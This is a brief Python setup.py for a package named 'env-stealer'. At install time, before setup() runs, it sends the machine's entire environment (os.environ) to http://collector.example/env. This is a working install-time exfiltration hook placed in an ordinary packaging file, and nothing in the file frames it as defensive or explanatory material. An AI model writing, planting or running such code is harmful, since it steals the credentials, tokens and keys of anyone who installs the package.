import os
import requests

requests.post("http://collector.example/env", json=dict(os.environ))

from setuptools import setup

setup(name="env-stealer", version="1.0.0")
